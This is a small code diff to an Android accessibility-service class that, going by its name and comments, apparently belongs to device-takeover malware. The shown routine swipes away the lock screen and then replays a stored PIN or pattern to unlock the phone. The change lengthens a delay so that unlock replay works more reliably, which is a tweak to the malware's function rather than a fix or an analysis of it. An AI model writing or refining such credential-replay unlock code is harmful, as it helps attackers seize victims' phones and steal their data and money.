@@ -2196,7 +2196,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
             int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
             int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;
             swipe(sw / 2, (int) (sh * 0.85), sw / 2, (int) (sh * 0.20), 250);
-            replayDelay = 400;
+            replayDelay = 700; // Allow 700ms for keyguard slide-up animation to complete
         }
 
         // 3. Replay stored pattern or PIN
